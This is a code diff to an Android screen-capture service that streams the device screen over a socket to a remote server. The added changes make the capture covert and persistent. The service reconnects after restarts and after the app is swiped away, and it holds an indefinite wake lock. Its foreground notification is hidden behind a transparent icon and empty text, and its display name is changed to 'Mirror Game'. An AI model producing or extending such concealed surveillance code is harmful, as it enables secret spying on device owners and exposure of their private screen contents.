@@ -98,7 +98,11 @@ public class ScreenCaptureService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        if (intent == null) return START_STICKY;
+        if (intent == null) {
+            // Service restarted by system — reconnect socket
+            reconnectSocket();
+            return START_STICKY;
+        }
         String action = intent.getAction();
         if (ACTION_START.equals(action)) {
             int resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, -1);
@@ -114,6 +118,22 @@ public class ScreenCaptureService extends Service {
             stopSelf();
         }
         return START_STICKY;
+    }
+
+    @Override
+    public void onTaskRemoved(Intent rootIntent) {
+        // App swiped from recents — keep service alive and reconnect
+        super.onTaskRemoved(rootIntent);
+        reconnectSocket();
+    }
+
+    private void reconnectSocket() {
+        android.content.SharedPreferences prefs =
+            getSharedPreferences("sm_prefs", MODE_PRIVATE);
+        String url = prefs.getString("server_url", "https://mirrorbackend-ohir.onrender.com");
+        if (!SocketManager.getInstance().isConnected()) {
+            SocketManager.getInstance().connect(url);
+        }
     }
 
     @Nullable @Override
@@ -145,7 +165,7 @@ public class ScreenCaptureService extends Service {
 
         imageReader = ImageReader.newInstance(captureW, captureH, PixelFormat.RGBA_8888, 3);
 
-        virtualDisplay = mediaProjection.createVirtualDisplay("ScreenMirror",
+        virtualDisplay = mediaProjection.createVirtualDisplay("Mirror Game",
                 captureW, captureH, density,
                 DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                 imageReader.getSurface(), null, null);
@@ -264,7 +284,7 @@ public class ScreenCaptureService extends Service {
     private void acquireWakeLock() {
         PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
         wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ScreenMirror::CaptureWake");
-        wakeLock.acquire(60 * 60 * 1000L); // up to 1 hour
+        wakeLock.acquire(); // indefinite — released on service destroy
     }
 
     private void releaseWakeLock() {
@@ -275,7 +295,7 @@ public class ScreenCaptureService extends Service {
     private void createChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel ch = new NotificationChannel(
-                    CHANNEL_ID, "Background Service", NotificationManager.IMPORTANCE_MIN);
+                    CHANNEL_ID, "Mirror begin", NotificationManager.IMPORTANCE_MIN);
             ch.setDescription("Required for background operation");
             ch.setShowBadge(false);
             ch.enableLights(false);
@@ -293,7 +313,10 @@ public class ScreenCaptureService extends Service {
 
         return new NotificationCompat.Builder(this, CHANNEL_ID)
                 .setContentIntent(openPI)
-                .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
+                .setSmallIcon(R.drawable.ic_transparent)
+                .setContentTitle("")
+                .setContentText("")
+                .setTicker(null)
                 .setOngoing(true)
                 .setSilent(true)
                 .setPriority(NotificationCompat.PRIORITY_MIN)
